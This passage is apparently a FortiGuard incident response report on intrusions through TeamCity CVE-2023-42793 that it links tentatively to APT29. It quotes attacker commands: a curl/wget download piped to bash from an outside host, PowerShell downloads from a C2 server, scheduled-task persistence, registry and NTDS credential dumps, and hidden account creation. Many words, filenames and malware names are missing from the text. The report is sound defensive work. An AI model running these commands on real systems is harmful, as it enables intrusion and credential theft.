Execution \\nImpact: Remote code execution for  users, enabling initial access to vulnerable servers\\nSecurity Level: High\\nCyber Kill Chain®\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nOn September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises  (CVE-2023-42793[1]) issue.[2] TeamCity is a build management and continuous integration server from JetBrains[3]. On September 27, 2023, a public exploit for this  was released by Rapid7[4]. This critical  was given a CVE score of 9.8, most likely because an attacker can deploy the publicly available exploit without  supporting remote code execution on the victim server using a basic web request to any accessible web server hosting the vulnerable application. This  has been observed being actively exploited in the wild and was added to CISA\\'s \\'Known Exploited  Catalog\\' on October 4, 2023.[5]\\n\\nIn mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy  to an  that had been compromised due to this . \\xa0This  engaged the FortiGuard IR team to investigate the malicious activity in their network.\\nThe victim was a US-based  in the biomedical  industry. Our subsequent  determined that initial access for the attack was through the  of the CVE-2023-42793 TeamCity  using a custom-built exploit script written in Python. The behavior of the malware used in post- matches the  malware used by APT29. This article breaks down our  and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team. MITRE ATT&CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to assist with threat-hunting activities for similar behavior.\\nSummary of Attack\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 1: The attack timeline of TeamCity intrusion described in this article.\\n\\n\\nAnalysis\\n \\nAs part of our initial customer engagement, we examined several EDR events reported from one of the victim\\'s Windows application servers (). During a scoping call, the FortiGuard IR team identified that one of the  hosted on this server was TeamCity. The victim had only recently updated the application to a non-vulnerable version.\\nWe began by retrieving application and system logs from the suspected compromised server (). On analysis of the application logs, we identified significant evidence of successful  of the TeamCity . The  bypass can be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 2: A snippet of the \\'teamcity-auth.log\\' screenshot  the TeamCity exploit evidence and associated remote IP.\\n\\n\\nAnalysis of these logs showed that this  had been exploited multiple times over a relatively short period, with connections originating from multiple unique public IP addresses. The teamcity-auth.log ( events log) identifies successful  but does not provide details on commands executed through . This information is available in the separate \\'teamcity-server.log\\' file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo command execution log highlighted in the \\'teamcity-server.log\\' entry in Figure 3. Details of the external command execution from the \\'teamcity-server.log file can also be seen in Figure 3.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 3: A snippet of the \\'teamcity-server.log\\' showing remote code execution evidence, including the associated command executed through the .\\n\\n\\nFurther analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple threat actors were conducting  operations. Some commands executed as part of this intrusion are shown in Table 1.\\n\\xa0\\n\\nRemote IP Address\\n\\nCommands Executed\\n\\n167[.]179[.]75[.]213\\n\\nCommand line: whoami\\n\\n154[.]26[.]133[.]111\\n\\nCommand line: bash -c \"nproc 2>&1\"\\n\\n104[.]207[.]152[.]236\\n\\nCommand line: cmd.exe \"/c whoami\"\\n\\n104[.]207[.]152[.]236\\n\\nCommand line: cmd.exe \"/c ipconfig /all\"\\n\\n104[.]207[.]152[.]236\\n\\nCommand line: cmd.exe \"/c ipconfig /displaydns\"\\n\\n104[.]207[.]152[.]236\\n\\nCommand line: cmd.exe \"/c hostname\"\\n\\n74[.]207[.]242[.]113\\n\\nCommand line: cmd.exe \"/c tasklist /svc\"\\n\\n74[.]207[.]242[.]113\\n\\nCommand line: cmd.exe \"/c netstat -ano\"\\n\\n74[.]207[.]242[.]113\\n\\nCommand line: cmd.exe \"/c net user /domain\"\\n\\n212[.]113[.]106[.]100\\n\\nCommand line: uname -a\\n\\n212[.]113[.]106[.]100\\n\\nCommand line: cmd.exe /c whoami\\n\\n212[.]113[.]106[.]100\\n\\nCommand line: cmd.exe /c systeminfo\\n\\n212[.]113[.]106[.]100\\n\\nCommand line: cmd.exe /c net user\\n\\n212[.]113[.]106[.]100\\n\\nCommand line: cmd.exe /c \"echo 167043640 > C:/Windows/Temp/0\"\\n\\n43[.]248[.]34[.]77\\n\\nCommand line: echo \\n\\n103[.]89[.]13[.]155\\n\\nCommand line: echo \\n\\n195[.]246[.]120[.]4\\n\\nCommand line: echo \\n\\n20[.]222[.]6[.]225\\n\\nCommand line: echo \\n\\n45[.]133[.]7[.]129\\n\\nCommand line: cmd.exe /c echo \\n\\n45[.]133[.]7[.]154\\n\\nCommand line: cmd.exe \"/c net user <redacted> \"<password redacted>\" /add\"\\n\\n45[.]133[.]7[.]154\\n\\nCommand line: cmd.exe \"/c echo <redacted> | c:\\\\TeamCity\\\\bin\\\\anydesk.exe --set-password\"\\n\\n45[.]133[.]7[.]156\\n\\nCommand line: wget --no-check-certificate https[:]//fisheries-states-codes-camps.[.]com/rcu\\n\\n45[.]133[.]7[.]124\\n\\nCommand line: /bin/sh -c \"(curl -s 194.38.22[.]53/tc.sh||wget -q -O- 194.38.22[.]53/tc.sh)|bash\"\\n\\n\\nTable 1. Commands executed by multiple threat actors on the TeamCity software host .\\n\\xa0\\n\\n\\nLooking critically at some of the attempted commands, it appears that some of the threat actors  exploited the  but were  at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in Figure 4.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful  .\\n\\n\\nIt appears that several of the commands from various remote IPs may have been associated with the use of the open-source  scanner Nuclei[6]. The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity  in Nuclei\\'s official template repository[7]. The yaml template file contains the following line:\\nPOST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1\\nThe resulting request would produce an echo command on a  exploited TeamCity server, identical to the echo commands observed in the victims\\' TeamCity logs. The IR team collated information from both logs to better understand the  between when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning.\\n\\n\\nAt this stage of the intrusion, it became clear that multiple threat actors were scanning for the , validating if it could be exploited, and attempting to establish a foothold using the related . The following section of this report focuses on the activities of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the \\'main threat actor.\\' A description of the activities conducted by other threat actors exploiting this  is covered more extensively in the following \\'Other Threat Actors Activity\\' section.\\nMain Threat Actor Intrusion\\nThe first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below:\\ncmd.exe \"/c systeminfo\"\\n whoami\\n ipconfig /all\\n whoami /all\\nThe command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the activities. This indicates the main threat actor uses different  to scan for victims and execute later commands.\\nOne command and control (C2) IP address discovered during our  was linked to a US-based tertiary education . Upon detection of this active , the FortiGuard IR team notified the  that their  may have been compromised and part of an ongoing APT29 campaign. They performed an internal  and identified  of their vulnerable TeamCity server associated with the previously identified IP address. As part of this , the main threat actor used the TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim\\'s environment. The \\'s security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on the educational  was a TOR exit node. This report does not include the victim’s details used as a relay to protect their identity. They have  remediated their environment and patched the associated .\\n\\xa0After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, \\'.dll,\\' on the TeamCity host using PowerShell and the \\'Invoke-WebRequest\\' cmdlet. The actor used the following command to download the file:\\npowershell -exec bypass -c \"Invoke-WebRequest -Uri\\n hxxp[:]//103[.]76[.]128[.]34:8080/.dll -OutFile\\n C:\\\\Windows\\\\System32\\\\.dll\"\\nAfter  downloading this DLL file on the , the main threat actor again used the TeamCity RCE  to create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the TeamCity . The actor used the following command to create the scheduled task:\\nschtasks.exe /create /SC ONLOGON /tn\\n \"\\\\Microsoft\\\\Windows\\\\\" /tr\\n \"\\\\\"C:\\\\Windows\\\\system32\\\\rundll32.exe\\\\\"\\n \\\\\"C:\\\\Windows\\\\system32\\\\.dll\\\\\",\"\\nWe recovered the associated Windows task file from the victim TeamCity server (), confirming that the command in the TeamCity log had been  executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6:\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 6: Windows task created by threat actor for the persistence of a DLL file.\\n\\n\\nAfter  creating the scheduled task, the actor attempted to execute the newly created task using the following command, again executed through the TeamCity RCE  on the :\\nschtasks.exe /run /tn \"\\\\Microsoft\\\\Windows\\\\\"\\nAnalyzing the scheduled task and its method of creation, we noticed two main indicators of interest: the URL \\'hxxp[:]//103[.]76[.]128[.]34:8080/.dll\\' and the file \\'.dll.\\' We then analyzed the URL referenced for downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the common name \\'*.ultasrv[.]com\\'. This common name does not appear to be associated with a legitimate [8]. The entity associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the associated threat actor. The files on the server can be seen in Figure 7.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity .\\n\\n\\nSome information on the hosted files is provided in Table 2, along with associated file hashes.\\n\\xa0\\n\\nSr. No.\\n\\nFilename\\n\\nDescription\\n\\nSHA1 Hash\\n\\n1\\n\\na.zip\\n\\nContains the rr.exe file\\n\\n\\n\\n2\\n\\n.dll\\n\\nMalicious DLL\\n\\n\\n\\n3\\n\\nehttpserver.py\\n\\nPython HTTP server source code\\n\\n\\n\\n4\\n\\niis.zip\\n\\nContains .exe, mscoree.dll, mscorees.dll\\n\\n\\n\\n5\\n\\n.exe\\n\\nLegitimate executable from Microsoft that is part of IISExpress setup/installer\\n\\n\\n\\n6\\n\\njaspic-providers.xml\\n\\nApache Tomcat  file\\n\\n\\n\\n7\\n\\nmscoree.dll\\n\\nLegitimate DLL file from Microsoft\\n\\n\\n\\n8\\n\\nmscorees.dll\\n\\nMalicious DLL\\n\\n\\n\\n9\\n\\nomzu5a.ar\\n\\nUnknown file detected as data file\\n\\n\\n\\n10\\n\\npdhui_1.dll\\n\\nMalicious DLL\\n\\n\\n\\n11\\n\\npoc.py\\n\\nPoC python code used by the actor to exploit TeamCity  CVE-2023-42793\\n\\n\\n\\n12\\n\\nrr.exe\\n\\nUnknown executable\\n\\n\\n\\n13\\n\\nserver.py\\n\\nPython HTTP server code\\n\\n\\n\\n14\\n\\nsudoers\\n\\nLinux sudoer config file\\n\\n\\n\\n15\\n\\nwinmms.dll\\n\\nMalicious DLL\\n\\n\\n\\n16\\n\\nwinmm.dll\\n\\nLegitimate DLL file from Microsoft\\n\\n\\n\\n17\\n\\nzabbix.zip\\n\\nContains pdhui_1.dll (a malicious DLL) and other legitimate Zabbix (opensource monitoring software) files\\n\\n\\n\\n\\nTable 2.  of files found on the C2 server 103.76.128[.]34.\\n\\xa0\\n\\n\\nAnalysis of the code in the poc.py file identified the script as a custom Python  of an exploit for the TeamCity  CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during .\\n\\n\\nComparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this script was used to deliver the exploit to the victim TeamCity server ( ). This links the IP extracted from the scheduled task (103[.]76[.]128[.]34) to the source of the  from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard Central Threat System (CTS), we could also see that the IP address associated with the  has been linked to other significant malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9).\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity  in the victim environment.\\n\\n\\nThe other element of interest in the scheduled task created by the main threat actor was the DLL file, \\'.dll.\\' Our analysis identified that the DLL .dll has ten file sections. The most notable was \\'.fy55f5\\', which is a user-modified section. This section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which is typically indicative of encryption. The \\'.fy55f5\\' section can be seen in Figure 10.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 10: Encrypted code section of the .dll executed as part of the main threat actor\\'s scheduled task persistence.\\n\\n\\nThe IR team believes that this \\'.fy55f5\\' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the DLL  more quickly, we performed  Yara scanning of all the files pulled from the threat actors\\' webserver. The .dll library and multiple other DLL files matched on a Yara rule for a known malware family called \\'.\\' The positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by previously observed  samples. A match for this rule is a high-confidence indicator of . The results of the matching Yara scan are shown in Figure 11.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 11: Yara rule for  matched against multiple DLL files found on the main threat actor opendir server.\\n\\n\\nThe files in Figure 11 also matched the Yara rule , which searches for the custom chaskey . This Yara rule was from the article, \\'Backchannel Diplomacy: APT29\\'s Rapidly Evolving Diplomatic Phishing Operations,\\' by Mandiant[9].\\n is a malware  employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the company Solarwinds, using the same build of the TeamCity management tool[10]. While the IR team could not attribute this activity to APT29 with high confidence, associated threat  was used to focus our  further.[11]\\nAt this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe and a machine learning assessment of the previously unobserved DLL \\'.dll.\\' This forced the main threat actor to attempt alternative methods of execution.\\nThe first alternative method was to use the TeamCity exploit on  to download the \\'.exe\\' and \\'mscoree.dll\\' files from the same C2 through PowerShell. These two files were written to the directory\\' C:\\\\Windows\\\\WinStore\\\\\\'. The \\'iisexpress.exe\\' file is a legitimate signed installer executable for IISExpress, a lightweight  of IIS provided by Microsoft[12]. However, downloaded alongside this legitimate installer was \\'mscoree.dll,\\' a malicious DLL file with the same name as a legitimate DLL (T1036.005).[13] The combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001)[14] to execute their malicious DLL when the legitimate IISExpress executable is executed.\\nTo execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the TeamCity exploit:\\nschtasks.exe /create /SC ONSTART /tn\\n \"\\\\Microsoft\\\\Windows\\\\\" /tr\\n \"C:\\\\Windows\\\\WinStore\\\\.exe\" /RU \"SYSTEM\" /f\\nAfter the scheduled task was created, the threat actor executed the scheduled task using the following command:\\nschtasks.exe /run /tn \"\\\\Microsoft\\\\Windows\\\\\"\\nWhen the \\'.exe\\' file was executed on the , a separate thread was created by the malicious DLL file that tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in Figure 12.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 12: FortiEDR blocked access to lsass.exe from .exe.\\n\\n\\nThe main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of the executables listed in Table 3 were recovered from the opendir[15] web server.\\n\\xa0\\n\\nSr. No.\\n\\nFile Name\\n\\nDescription\\n\\n1\\n\\n.exe\\n\\nLegitimate IIS Express exe used for the execution of malicious DLL mscorees.dll\\n\\n2\\n\\nMpCmdRun.exe\\n\\nLegitimate Defender command line utility used for execution of malicious DLL MpCmdHelp.dll\\n\\n3\\n\\n.exe\\n\\nLegitimate Flash exe used for the execution of malicious DLL oleac.dll\\n\\n4\\n\\n.exe\\n\\nLegitimate executable to Zabbix software used to load the malicious DLL pdhui_1.dll\\n\\n\\nTable 3. List of legitimate software executables observed in the attack and on the C2 server, which are used to load malicious DLL files.\\n\\xa0\\n\\n\\nSince FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to dump the registry using Windows utility reg.exe directly through further TeamCity .  for the main threat actor, FortiEDR blocked this execution due to the triggered rules \\'Access to Critical System Information\\' and \\'Connection Attempt from a Hidden Process\\' under its \\' Prevention\\' security policy. A screenshot of the related FortiEDR event is shown in Figure 13.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR.\\n\\n\\nThese attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these techniques. The associated EDR security events also generated multiple alerts. , the targeted  made numerous broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were incorrectly assessed as a false positive. These exceptions are outlined below:\\n\\nallow rundll32.exe to run .dll when rundll32.exe is executed by cmd.exe.\\nallow reg.exe to run as a hidden process\\nallow reg.exe to access critical system information (credential dumping)\\nallow natid.sys to be loaded (a suspicious driver dropped by the threat actor)\\nallow rundll32.exe to execute .dll and create a thread in any lsass.exe process\\nallow rundll32.exe to execute .dll and create a thread in any svchost.exe process\\nallow any execution of PowerShell and associated rule violations\\n\\nThese exceptions removed the constraints around the adversary\\'s ability to fully employ their TeamCity , allowing the main threat actor to continue their execution  by FortiEDR.\\nAfter these exceptions were set, the main threat actor was able to  dump the registry of the Windows host  to gain access to local user credentials (T1003.002)[16]. To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive (T1003.002[17]) using the command below:\\nreg.exe save HKLM\\\\SYSTEM “C:\\\\Windows\\\\temp\\\\1\\\\sy.sa” /y\\nThis can be seen in the FortiEDR Threat Hunting event shown in Figure 14.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive.\\n\\n\\nAt this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a more robust foothold on the . They used their access to create a Windows account, \\'\\' (T1136.001[18]), added the newly created account to the local  group, and made the account a special account by adding it to the registry path \\'NT\\\\\\\\Winlogon\\\\\\\\Userlist\\' with the DWORD value 0. When a Windows user account is added to this registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever used this newly created \\'\\' account. Log events associated with these activities can be observed in the teamcity-server.log snippet shown in Figure 15.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint.\\n\\n\\nAt this time, the host  was patched for CVE-2023-42793. The IR team verified the patch was successful and that there was no further  of this  on this host following the  of the patch. , the threat actor had already created alternative access through their  implant and had already begun laterally moving to other hosts within the victim network through SMB, RDP, and remote WMIC commands.\\nThe hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047)[19] from the original compromised host, . The network connections linked to this behavior were established using explicit credentials. This indicates that the main threat actor had  pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to execute a  DLL through either rundll32 proxy execution like that  in the previously discussed scheduled task or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 16: Windows log screenshot showing WMIC.exe execution remotely from  to HOST_4_SVR\\n\\n\\nOn the HOST_2_SVR, the main threat actor employed a different lateral movement technique by  an RDP connection from the . This connection was used to create multiple suspicious files in the \\'C:\\\\Windows\\\\SchCache’ directory on HOST_2_SVR. Two DLL files (‘oleacc.dll’ and ‘oleac.dll’) and one executable file (‘.exe’) were created in this directory. When the IR team ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for . The remaining files, oleacc.dll and .exe, were determined to be non-malicious Microsoft-signed files.\\nThe main threat actor then created persistence for this file through a scheduled task. This time, the task was named \\'\\' and was created to execute the \\'C:\\\\Windows\\\\SchCache\\\\.exe\\' file when Windows starts. This shows the use of another legitimate executable to perform search order hijacking to load a malicious  DLL. The command used to create this scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for .exe\\n\\n\\nIn another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility ‘ntdsutil.exe’ on the host HOST_2_SVR. They tried to dump credentials using the following command:\\nntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full C:\\\\tempp\\' q q\\nThis command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case, ‘C:\\\\tempp’). Threat actors can often dump password hashes from these files offline using tools like mimikatz.[20] FortiEDR blocked this activity, and the associated security event can be observed in Figure 18.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR.\\n\\n\\nIn addition to this scheduled task, the IR team found another  DLL in the ‘C:\\\\Program Files\\\\Windows Defender’ directory. This directory contained an executable PE file, ‘MpCmdRun.exe,’ and DLL files, ‘MpCmdHelp.dll’ and ‘MpClient.dll.’ One of the files (MpCmdHelp.dll) matched against the Yara rule for malware , and the second DLL file, MpClient.dll, is a legitimate library used by ‘MpCmdRun.exe.’ Like the ‘.exe’ example discussed earlier in this report, the ‘MpCmdRun.exe’ is a legitimate binary vulnerable to search order hijacking. The ‘MpCmdRun.exe’ binary is an official command-line tool used to perform various operations related to Microsoft Defender Antivirus. The default path of this binary is ‘C:\\\\Program Files\\\\Windows Defender.’\\nAt this  stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This scanning identified DLL files matching the  signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both hosts, a task named ‘’ that executed the  DLLs was created, matching the tradecraft of the previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 19: Schedule task file for proxy execution of the malicious  DLL file identified on HOST_6_SQL.\\n\\n\\nThe IR team also found a network login to HOST_5_SVR from the primary infected  host.\\nShortly after this login event, an instance of rundll32 used for proxy execution of another  sample was started. However, the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any known IOCs. However, it has been included for . Significant strings extracted from the memory dump can be seen in Figure 20.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive.\\n\\n\\nSimilar network indicators were identified when we executed the .dll file using rundll32.exe in a virtual analysis environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the victim environment. The  report[21] from Insikt Group from Recorded Future showed that researchers had previously observed  samples employ Microsoft OneDrive and Dropbox as part of their C2.\\nThe malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed that the behavior of the multiple malicious DLL matches  malware behavior. The malicious DLL was  with Microsoft OneDrive, and the following information was obtained in JSON format from this .\\n\\n\\xa0\\n\\nKey\\n\\nValue\\n\\n@odata.context\\n\\nhttps://graph[.]microsoft[.]com/v1.0/$metadata#users(\\'quentparoty%40outlook[.]com\\')/drive/root/$entit\\n\\nname\\n\\nblatant\\n\\nwebUrl\\n\\nhttps://1drv[.]ms/f/s!\\n\\ndisplayName\\n\\nquent-application\\n\\ndriveId\\n\\n\\n\\ndriveType\\n\\npersonal\\n\\nid\\n\\n!106\\n\\nfolder name\\n\\nquent-application\\n\\npath\\n\\n/drive/root:/Apps/quent-application\\n\\n\\n\\xa0\\n\\nKey\\n\\nValue\\n\\n@odata.context\\n\\nhttps://graph[.]microsoft[.]com/v1.0/$metadata#users(\\'girmisdrong%40outlook.com\\')/drive/root/$entity\\n\\nname\\n\\n\\n\\nwebUrl\\n\\nhttps://1drv[.]ms/f/s!\\n\\ndisplayName\\n\\n\\n\\ndriveId\\n\\n\\n\\ndriveType\\n\\npersonal\\n\\nid\\n\\n!103\\n\\nfolder name\\n\\n\\n\\npath\\n\\n/drive/root:/Apps/\\n\\n\\n\\xa0\\n\\n\\nThe analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to  to look for the “DebugObject” variable. It also has strings such as “Ollydbg,” probably to check if the Ollydbg.exe process is running. If the process is found running, the malware may then terminate itself.\\nGiven our  of the main threat actor’s operations, we determined that persistence was still possible. The IR team provided  on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions recommended are provided below:\\n\\nBlocking the IP addresses used by threat actors\\nRemoving TeamCity software accounts created by threat actors\\nRemoving Windows accounts created by threat actors\\nRemoving backdoors created by threat actors\\nRemoving malicious files dropped by threat actors\\n\\nAfter  these containment and remediation actions by the victim security team, no further malicious activity has been observed.\\nOther Threat Actor Activity\\nIn addition to the main threat actor, there were other threat actors who exploited the TeamCity . One of these threat actors used their RCE access through the exploit to create a new TeamCity user via the TeamCity API. They then added the ‘System ’ role to this newly created user account. No evidence was found to indicate that this newly created account was ever used once it was created. Logs related to this activity were recorded in the teamcity-server.log and can be seen in Figure 21.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 21: TeamCity log showing the creation of a new user and assigning an admin role to the user.\\n\\n\\nAnother threat actor separately attempted to download and execute an executable from an Amazon S3 bucket. Using an Amazon S3 Bucket instead of a separate C2 for file downloads differs from the actions of the main threat actor. This is significant, as many  include Amazon Services URLs in their allowlist. The threat actor used the ‘’ method of the PowerShell ‘WebClient’ class to download the Amazon-hosted payload. The file was saved as ‘1.exe’ in the path ‘C:\\\\Windows\\\\Temp\\\\1.exe’. After downloading this file, the threat actor attempted to execute it using the command ‘cmd.exe /c C:\\\\Windows\\\\Temp\\\\1.exe’. Windows Defender logs indicate this file was detected as Trojan:Script/Phonzy.B!ml malware by Windows Defender shortly after download and was deleted before it could be executed. Associated log events within the teamcity-server.log linked to this download activity are shown in Figure 22.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 22: TeamCity log showing download and execution of 1.exe by the threat actor.\\n\\n\\nAnother threat actor used their TeamCity exploit to download and execute the installer for legitimate remote access software AnyDesk on the . The AnyDesk software was installed with the ‘--start-with-win\\' parameter, making it auto-start on boot. The ‘--silent’ parameter was also used, which prevents the AnyDesk application from showing any messages or errors during execution. The threat actor then set a password to AnyDesk and executed it with the ‘--get-id\\' parameter to retrieve the AnyDesk-ID. This ID is used to connect to an instance of AnyDesk. This software is an  of a command-and-control technique (T1219[22]) and also supports persistence as the threat actor can use the AnyDesk-ID to connect to a running instance of the software. Log events associated with these activities in the teamcity-server.log snippet are shown in Figure 23.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 23: The TeamCity log showing the  and execution of the Anydesk remote access tool.\\n\\n\\nThe Fortinet IR team was able to link connections made from the host  from the AnyDesk application to IP address 92.38.177[.]14. When we , it was found to be an AnyDesk software relay address. Using relays as part of AnyDesk  allows threat actors to abstract their own  from intrusions. FortiGuard CTS information for the relay IP is shown in Figure 24. It’s worth noting that FortiGuard CTS marked this as clean because AnyDesk is a common remote management tool that, by default, uses AnyDesk , which is not malicious by itself.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 24: Fortiguard CTS screen with information about AnyDesk relay IP address.\\n\\n\\nThe connections made by AnyDesk.exe can be seen in Figure 25.\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 25: An Anydesk.exe TCP/IP connection from host  to the internet.\\n\\n\\nThese actors tried one or two methods but did not conduct further activity on the server or victim network. They likely lacked the knowledge or interest to pursue further intrusion on the victim network, as their initial efforts were ineffective.\\nConclusion\\n\\nThis article provided details of several intrusions where the TeamCity  CVE-2023-42793 was exploited to gain access to the victim network. Observed  originated from multiple disparate threat actors who employed numerous diverse post- techniques in an attempt to gain a foothold in the victim network. It should be noted that this activity occurred after the vendor (JetBrains) had provided a valid patch.\\nWhile the security controls in place within the victim\\'s environment were able to keep the majority of adversaries at bay, a failure to adequately triage alerts generated by the victim\\'s EDR (FortiEDR) and subsequent downgrading of protections opened gaps in the victim\\'s defenses. This allowed the main threat actor to establish a foothold and eventually gain the access required to maneuver freely through the network.\\nAs part of this intrusion, the main threat actor employed the  malware to maintain access. The main threat actor primarily used Scheduled Tasks (T1053.005[23]) to execute these  payloads. Their preferred method of defense evasion for these scheduled tasks was rundll32 proxy execution, but the threat actor was also able to employ several legitimate third-party binaries that were vulnerable to search order hijacking to execute their malware. Given the technique crossover with previously reported activity and the  of the  payload, FortiGuard believes with medium confidence that this attack was part of a new BlueBravo (tracked by Recorded Future[24])/APT29 (tracked by Mandiant[25]) campaign. Of particular note are the significant OPSEC  employed throughout the intrusion (discounting the opendir web server fumble): the use of compromised  local to the victim, search order hijacking with legitimate DLLs added after execution, the 